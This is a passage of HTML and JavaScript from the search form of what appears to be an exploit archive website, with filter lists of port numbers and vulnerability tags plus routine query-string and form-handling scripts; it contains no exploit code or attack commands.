                                       placeholder="Exploit content" value="">

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-2">

                            <label for="portSearchSelect" class="text-primary">Port</label>

                            <select id="portSearchSelect" name="port" class="form-control">

                                <option></option>
                                
                                    <option value="14" >
                                        14
                                    </option>


                                
                                    <option value="21" >
                                        21
                                    </option>


                                
                                    <option value="22" >
                                        22
                                    </option>


                                
                                    <option value="23" >
                                        23
                                    </option>


                                
                                    <option value="25" >
                                        25
                                    </option>


                                
                                    <option value="42" >
                                        42
                                    </option>


                                
                                    <option value="49" >
                                        49
                                    </option>


                                
                                    <option value="53" >
                                        53
                                    </option>


                                
                                    <option value="66" >
                                        66
                                    </option>


                                
                                    <option value="69" >
                                        69
                                    </option>


                                
                                    <option value="70" >
                                        70
                                    </option>


                                
                                    <option value="79" >
                                        79
                                    </option>


                                
                                    <option value="80" >
                                        80
                                    </option>


                                
                                    <option value="81" >
                                        81
                                    </option>


                                
                                    <option value="102" >
                                        102
                                    </option>


                                
                                    <option value="105" >
                                        105
                                    </option>


                                
                                    <option value="110" >
                                        110
                                    </option>


                                
                                    <option value="111" >
                                        111
                                    </option>


                                
                                    <option value="113" >
                                        113
                                    </option>


                                
                                    <option value="119" >
                                        119
                                    </option>


                                
                                    <option value="123" >
                                        123
                                    </option>


                                
                                    <option value="135" >
                                        135
                                    </option>


                                
                                    <option value="139" >
                                        139
                                    </option>


                                
                                    <option value="143" >
                                        143
                                    </option>


                                
                                    <option value="161" >
                                        161
                                    </option>


                                
                                    <option value="162" >
                                        162
                                    </option>


                                
                                    <option value="164" >
                                        164
                                    </option>


                                
                                    <option value="383" >
                                        383
                                    </option>


                                
                                    <option value="389" >
                                        389
                                    </option>


                                
                                    <option value="402" >
                                        402
                                    </option>


                                
                                    <option value="406" >
                                        406
                                    </option>


                                
                                    <option value="411" >
                                        411
                                    </option>


                                
                                    <option value="443" >
                                        443
                                    </option>


                                
                                    <option value="444" >
                                        444
                                    </option>


                                
                                    <option value="445" >
                                        445
                                    </option>


                                
                                    <option value="446" >
                                        446
                                    </option>


                                
                                    <option value="502" >
                                        502
                                    </option>


                                
                                    <option value="504" >
                                        504
                                    </option>


                                
                                    <option value="513" >
                                        513
                                    </option>


                                
                                    <option value="514" >
                                        514
                                    </option>


                                
                                    <option value="515" >
                                        515
                                    </option>


                                
                                    <option value="532" >
                                        532
                                    </option>


                                
                                    <option value="548" >
                                        548
                                    </option>


                                
                                    <option value="554" >
                                        554
                                    </option>


                                
                                    <option value="555" >
                                        555
                                    </option>


                                
                                    <option value="617" >
                                        617
                                    </option>


                                
                                    <option value="623" >
                                        623
                                    </option>


                                
                                    <option value="631" >
                                        631
                                    </option>


                                
                                    <option value="655" >
                                        655
                                    </option>


                                
                                    <option value="689" >
                                        689
                                    </option>


                                
                                    <option value="783" >
                                        783
                                    </option>


                                
                                    <option value="787" >
                                        787
                                    </option>


                                
                                    <option value="808" >
                                        808
                                    </option>


                                
                                    <option value="873" >
                                        873
                                    </option>


                                
                                    <option value="888" >
                                        888
                                    </option>


                                
                                    <option value="901" >
                                        901
                                    </option>


                                
                                    <option value="998" >
                                        998
                                    </option>


                                
                                    <option value="1000" >
                                        1000
                                    </option>


                                
                                    <option value="1040" >
                                        1040
                                    </option>


                                
                                    <option value="1089" >
                                        1089
                                    </option>


                                
                                    <option value="1099" >
                                        1099
                                    </option>


                                
                                    <option value="1100" >
                                        1100
                                    </option>


                                
                                    <option value="1114" >
                                        1114
                                    </option>


                                
                                    <option value="1120" >
                                        1120
                                    </option>


                                
                                    <option value="1194" >
                                        1194
                                    </option>


                                
                                    <option value="1235" >
                                        1235
                                    </option>


                                
                                    <option value="1471" >
                                        1471
                                    </option>


                                
                                    <option value="1521" >
                                        1521
                                    </option>


                                
                                    <option value="1533" >
                                        1533
                                    </option>


                                
                                    <option value="1581" >
                                        1581
                                    </option>


                                
                                    <option value="1589" >
                                        1589
                                    </option>


                                
                                    <option value="1604" >
                                        1604
                                    </option>


                                
                                    <option value="1617" >
                                        1617
                                    </option>


                                
                                    <option value="1723" >
                                        1723
                                    </option>


                                
                                    <option value="1743" >
                                        1743
                                    </option>


                                
                                    <option value="1761" >
                                        1761
                                    </option>


                                
                                    <option value="1812" >
                                        1812
                                    </option>


                                
                                    <option value="1858" >
                                        1858
                                    </option>


                                
                                    <option value="1861" >
                                        1861
                                    </option>


                                
                                    <option value="1900" >
                                        1900
                                    </option>


                                
                                    <option value="1947" >
                                        1947
                                    </option>


                                
                                    <option value="2000" >
                                        2000
                                    </option>


                                
                                    <option value="2022" >
                                        2022
                                    </option>


                                
                                    <option value="2049" >
                                        2049
                                    </option>


                                
                                    <option value="2100" >
                                        2100
                                    </option>


                                
                                    <option value="2103" >
                                        2103
                                    </option>


                                
                                    <option value="2121" >
                                        2121
                                    </option>


                                
                                    <option value="2125" >
                                        2125
                                    </option>


                                
                                    <option value="2181" >
                                        2181
                                    </option>


                                
                                    <option value="2242" >
                                        2242
                                    </option>


                                
                                    <option value="2315" >
                                        2315
                                    </option>


                                
                                    <option value="2375" >
                                        2375
                                    </option>


                                
                                    <option value="2380" >
                                        2380
                                    </option>


                                
                                    <option value="2381" >
                                        2381
                                    </option>


                                
                                    <option value="2401" >
                                        2401
                                    </option>


                                
                                    <option value="2480" >
                                        2480
                                    </option>


                                
                                    <option value="2525" >
                                        2525
                                    </option>


                                
                                    <option value="2640" >
                                        2640
                                    </option>


                                
                                    <option value="2810" >
                                        2810
                                    </option>


                                
                                    <option value="2812" >
                                        2812
                                    </option>


                                
                                    <option value="2947" >
                                        2947
                                    </option>


                                
                                    <option value="2954" >
                                        2954
                                    </option>


                                
                                    <option value="2990" >
                                        2990
                                    </option>


                                
                                    <option value="3000" >
                                        3000
                                    </option>


                                
                                    <option value="3030" >
                                        3030
                                    </option>


                                
                                    <option value="3050" >
                                        3050
                                    </option>


                                
                                    <option value="3052" >
                                        3052
                                    </option>


                                
                                    <option value="3128" >
                                        3128
                                    </option>


                                
                                    <option value="3129" >
                                        3129
                                    </option>


                                
                                    <option value="3181" >
                                        3181
                                    </option>


                                
                                    <option value="3200" >
                                        3200
                                    </option>


                                
                                    <option value="3217" >
                                        3217
                                    </option>


                                
                                    <option value="3306" >
                                        3306
                                    </option>


                                
                                    <option value="3333" >
                                        3333
                                    </option>


                                
                                    <option value="3378" >
                                        3378
                                    </option>


                                
                                    <option value="3389" >
                                        3389
                                    </option>


                                
                                    <option value="3460" >
                                        3460
                                    </option>


                                
                                    <option value="3465" >
                                        3465
                                    </option>


                                
                                    <option value="3500" >
                                        3500
                                    </option>


                                
                                    <option value="3535" >
                                        3535
                                    </option>


                                
                                    <option value="3632" >
                                        3632
                                    </option>


                                
                                    <option value="3690" >
                                        3690
                                    </option>


                                
                                    <option value="3790" >
                                        3790
                                    </option>


                                
                                    <option value="3814" >
                                        3814
                                    </option>


                                
                                    <option value="3817" >
                                        3817
                                    </option>


                                
                                    <option value="4000" >
                                        4000
                                    </option>


                                
                                    <option value="4002" >
                                        4002
                                    </option>


                                
                                    <option value="4070" >
                                        4070
                                    </option>


                                
                                    <option value="4081" >
                                        4081
                                    </option>


                                
                                    <option value="4105" >
                                        4105
                                    </option>


                                
                                    <option value="4111" >
                                        4111
                                    </option>


                                
                                    <option value="4322" >
                                        4322
                                    </option>


                                
                                    <option value="4343" >
                                        4343
                                    </option>


                                
                                    <option value="4434" >
                                        4434
                                    </option>


                                
                                    <option value="4501" >
                                        4501
                                    </option>


                                
                                    <option value="4555" >
                                        4555
                                    </option>


                                
                                    <option value="4592" >
                                        4592
                                    </option>


                                
                                    <option value="4661" >
                                        4661
                                    </option>


                                
                                    <option value="4750" >
                                        4750
                                    </option>


                                
                                    <option value="4848" >
                                        4848
                                    </option>


                                
                                    <option value="5000" >
                                        5000
                                    </option>


                                
                                    <option value="5060" >
                                        5060
                                    </option>


                                
                                    <option value="5061" >
                                        5061
                                    </option>


                                
                                    <option value="5080" >
                                        5080
                                    </option>


                                
                                    <option value="5081" >
                                        5081
                                    </option>


                                
                                    <option value="5093" >
                                        5093
                                    </option>


                                
                                    <option value="5151" >
                                        5151
                                    </option>


                                
                                    <option value="5180" >
                                        5180
                                    </option>


                                
                                    <option value="5247" >
                                        5247
                                    </option>


                                
                                    <option value="5250" >
                                        5250
                                    </option>


                                
                                    <option value="5272" >
                                        5272
                                    </option>


                                
                                    <option value="5308" >
                                        5308
                                    </option>


                                
                                    <option value="5432" >
                                        5432
                                    </option>


                                
                                    <option value="5466" >
                                        5466
                                    </option>


                                
                                    <option value="5554" >
                                        5554
                                    </option>


                                
                                    <option value="5555" >
                                        5555
                                    </option>


                                
                                    <option value="5600" >
                                        5600
                                    </option>


                                
                                    <option value="5655" >
                                        5655
                                    </option>


                                
                                    <option value="5666" >
                                        5666
                                    </option>


                                
                                    <option value="5800" >
                                        5800
                                    </option>


                                
                                    <option value="5803" >
                                        5803
                                    </option>


                                
                                    <option value="5814" >
                                        5814
                                    </option>


                                
                                    <option value="5858" >
                                        5858
                                    </option>


                                
                                    <option value="5900" >
                                        5900
                                    </option>


                                
                                    <option value="5984" >
                                        5984
                                    </option>


                                
                                    <option value="6066" >
                                        6066
                                    </option>


                                
                                    <option value="6070" >
                                        6070
                                    </option>


                                
                                    <option value="6080" >
                                        6080
                                    </option>


                                
                                    <option value="6082" >
                                        6082
                                    </option>


                                
                                    <option value="6101" >
                                        6101
                                    </option>


                                
                                    <option value="6112" >
                                        6112
                                    </option>


                                
                                    <option value="6129" >
                                        6129
                                    </option>


                                
                                    <option value="6379" >
                                        6379
                                    </option>


                                
                                    <option value="6502" >
                                        6502
                                    </option>


                                
                                    <option value="6503" >
                                        6503
                                    </option>


                                
                                    <option value="6660" >
                                        6660
                                    </option>


                                
                                    <option value="6667" >
                                        6667
                                    </option>


                                
                                    <option value="7001" >
                                        7001
                                    </option>


                                
                                    <option value="7002" >
                                        7002
                                    </option>


                                
                                    <option value="7070" >
                                        7070
                                    </option>


                                
                                    <option value="7071" >
                                        7071
                                    </option>


                                
                                    <option value="7080" >
                                        7080
                                    </option>


                                
                                    <option value="7100" >
                                        7100
                                    </option>


                                
                                    <option value="7144" >
                                        7144
                                    </option>


                                
                                    <option value="7210" >
                                        7210
                                    </option>


                                
                                    <option value="7272" >
                                        7272
                                    </option>


                                
                                    <option value="7290" >
                                        7290
                                    </option>


                                
                                    <option value="7426" >
                                        7426
                                    </option>


                                
                                    <option value="7443" >
                                        7443
                                    </option>


                                
                                    <option value="7510" >
                                        7510
                                    </option>


                                
                                    <option value="7547" >
                                        7547
                                    </option>


                                
                                    <option value="7649" >
                                        7649
                                    </option>


                                
                                    <option value="7770" >
                                        7770
                                    </option>


                                
                                    <option value="7777" >
                                        7777
                                    </option>


                                
                                    <option value="7778" >
                                        7778
                                    </option>


                                
                                    <option value="7787" >
                                        7787
                                    </option>


                                
                                    <option value="7879" >
                                        7879
                                    </option>


                                
                                    <option value="7902" >
                                        7902
                                    </option>


                                
                                    <option value="8000" >
                                        8000
                                    </option>


                                
                                    <option value="8001" >
                                        8001
                                    </option>


                                
                                    <option value="8002" >
                                        8002
                                    </option>


                                
                                    <option value="8004" >
                                        8004
                                    </option>


                                
                                    <option value="8008" >
                                        8008
                                    </option>


                                
                                    <option value="8020" >
                                        8020
                                    </option>


                                
                                    <option value="8022" >
                                        8022
                                    </option>


                                
                                    <option value="8023" >
                                        8023
                                    </option>


                                
                                    <option value="8028" >
                                        8028
                                    </option>


                                
                                    <option value="8030" >
                                        8030
                                    </option>


                                
                                    <option value="8080" >
                                        8080
                                    </option>


                                
                                    <option value="8081" >
                                        8081
                                    </option>


                                
                                    <option value="8082" >
                                        8082
                                    </option>


                                
                                    <option value="8088" >
                                        8088
                                    </option>


                                
                                    <option value="8090" >
                                        8090
                                    </option>


                                
                                    <option value="8181" >
                                        8181
                                    </option>


                                
                                    <option value="8300" >
                                        8300
                                    </option>


                                
                                    <option value="8400" >
                                        8400
                                    </option>


                                
                                    <option value="8443" >
                                        8443
                                    </option>


                                
                                    <option value="8445" >
                                        8445
                                    </option>


                                
                                    <option value="8473" >
                                        8473
                                    </option>


                                
                                    <option value="8500" >
                                        8500
                                    </option>


                                
                                    <option value="8585" >
                                        8585
                                    </option>


                                
                                    <option value="8619" >
                                        8619
                                    </option>


                                
                                    <option value="8800" >
                                        8800
                                    </option>


                                
                                    <option value="8812" >
                                        8812
                                    </option>


                                
                                    <option value="8839" >
                                        8839
                                    </option>


                                
                                    <option value="8880" >
                                        8880
                                    </option>


                                
                                    <option value="8888" >
                                        8888
                                    </option>


                                
                                    <option value="9000" >
                                        9000
                                    </option>


                                
                                    <option value="9001" >
                                        9001
                                    </option>


                                
                                    <option value="9002" >
                                        9002
                                    </option>


                                
                                    <option value="9080" >
                                        9080
                                    </option>


                                
                                    <option value="9090" >
                                        9090
                                    </option>


                                
                                    <option value="9091" >
                                        9091
                                    </option>


                                
                                    <option value="9100" >
                                        9100
                                    </option>


                                
                                    <option value="9124" >
                                        9124
                                    </option>


                                
                                    <option value="9200" >
                                        9200
                                    </option>


                                
                                    <option value="9251" >
                                        9251
                                    </option>


                                
                                    <option value="9256" >
                                        9256
                                    </option>


                                
                                    <option value="9443" >
                                        9443
                                    </option>


                                
                                    <option value="9447" >
                                        9447
                                    </option>


                                
                                    <option value="9784" >
                                        9784
                                    </option>


                                
                                    <option value="9788" >
                                        9788
                                    </option>


                                
                                    <option value="9855" >
                                        9855
                                    </option>


                                
                                    <option value="9876" >
                                        9876
                                    </option>


                                
                                    <option value="9900" >
                                        9900
                                    </option>


                                
                                    <option value="9987" >
                                        9987
                                    </option>


                                
                                    <option value="9993" >
                                        9993
                                    </option>


                                
                                    <option value="9999" >
                                        9999
                                    </option>


                                
                                    <option value="10000" >
                                        10000
                                    </option>


                                
                                    <option value="10001" >
                                        10001
                                    </option>


                                
                                    <option value="10080" >
                                        10080
                                    </option>


                                
                                    <option value="10202" >
                                        10202
                                    </option>


                                
                                    <option value="10203" >
                                        10203
                                    </option>


                                
                                    <option value="10443" >
                                        10443
                                    </option>


                                
                                    <option value="10616" >
                                        10616
                                    </option>


                                
                                    <option value="11000" >
                                        11000
                                    </option>


                                
                                    <option value="11211" >
                                        11211
                                    </option>


                                
                                    <option value="11460" >
                                        11460
                                    </option>


                                
                                    <option value="12203" >
                                        12203
                                    </option>


                                
                                    <option value="12221" >
                                        12221
                                    </option>


                                
                                    <option value="12345" >
                                        12345
                                    </option>


                                
                                    <option value="12397" >
                                        12397
                                    </option>


                                
                                    <option value="12401" >
                                        12401
                                    </option>


                                
                                    <option value="13327" >
                                        13327
                                    </option>


                                
                                    <option value="13701" >
                                        13701
                                    </option>


                                
                                    <option value="13722" >
                                        13722
                                    </option>


                                
                                    <option value="13838" >
                                        13838
                                    </option>


                                
                                    <option value="16992" >
                                        16992
                                    </option>


                                
                                    <option value="18821" >
                                        18821
                                    </option>


                                
                                    <option value="18881" >
                                        18881
                                    </option>


                                
                                    <option value="19000" >
                                        19000
                                    </option>


                                
                                    <option value="19810" >
                                        19810
                                    </option>


                                
                                    <option value="19813" >
                                        19813
                                    </option>


                                
                                    <option value="20000" >
                                        20000
                                    </option>


                                
                                    <option value="20002" >
                                        20002
                                    </option>


                                
                                    <option value="20010" >
                                        20010
                                    </option>


                                
                                    <option value="20031" >
                                        20031
                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
